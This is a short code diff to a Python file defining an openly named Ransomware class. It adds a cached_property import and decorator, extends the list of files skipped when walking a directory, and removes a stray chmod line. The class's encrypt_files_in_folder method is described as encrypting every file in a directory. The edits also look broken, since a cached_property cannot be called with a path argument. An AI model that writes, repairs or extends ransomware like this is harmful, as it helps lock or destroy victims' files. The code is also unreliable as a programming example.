@@ -15,6 +15,7 @@ import logging  # For logging debug messages.
 import os       # For interacting with the operating system (e.g., file paths).
 import sys      # For accessing system-specific parameters and functions.
 import base64   # For encoding and decoding data using Base64.
+from cached_property import cached_property
 
 
 class Ransomware:
@@ -108,7 +109,7 @@ class Ransomware:
 
         for file in os.listdir(path):
             # Skip specified files and directories.
-            if file in ('README.md', script_name, '.git', '.', '..'):
+            if file in ('README.md', script_name, '.git', '.', '..', 'requirements.txt'):
                 logging.debug(f"Skipping file: {file}")
                 continue
 
@@ -176,10 +177,8 @@ class Ransomware:
 
 
     """
-
-    # Ensure that the injected file is executable.
-    os.chmod(file, 777)
     
+    @cached_property
     def encrypt_files_in_folder(self, path):
         """
         Encrypts all files in the given directory specified by path.
